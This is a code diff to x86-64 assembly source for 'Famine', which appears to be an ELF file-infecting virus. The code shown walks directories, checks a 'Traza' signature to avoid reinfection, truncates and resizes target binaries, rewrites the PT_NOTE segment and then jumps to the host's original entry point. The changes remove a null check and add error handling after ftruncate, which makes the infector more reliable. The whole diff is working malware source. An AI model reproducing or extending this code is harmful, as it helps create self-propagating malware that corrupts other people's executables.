@@ -26,10 +26,6 @@ section .text
         ; save dirname pointer to iterate after
         mov VAR(Famine.dir_name_pointer), rdi
 
-        ; if (dirname == NULL), end
-        cmp byte [rdi], 0
-        je .exit
-
         ; open(rdi, O_RDONLY | O_DIRECTORY);
         mov rsi, O_RDONLY | O_DIRECTORY
         mov rax, SC_OPEN
@@ -174,9 +170,9 @@ section .text
         add rsi, rbx
         sub rsi, rcx
         lea rdi, Traza
-        mov rcx, 20
-        cld
-        rep cmpsb
+        mov rcx, 20         
+        cld                 ; incremental
+        rep cmpsb           ; comparar rdi y rsi rcx bytes
         je .munmap
 
 
@@ -239,6 +235,8 @@ section .text
         mov esi, dword VAR(Famine.file_final_len)
         mov rax, SC_FTRUNCATE
         syscall
+        test rax, rax
+        jnz .munmap
     
     .mod_pt_note:
         ; Famine.note_phdr_ptr es una dirección de memoria que apunta a un puntero
@@ -326,7 +324,6 @@ section .text
         add rax, [rel host_entrypoint]      ; Dirección host (Base + Offset)
         jmp rax
     
-    .exit:
     _dummy_host_entrypoint:
         mov rax, SC_EXIT
         xor rdi, rdi
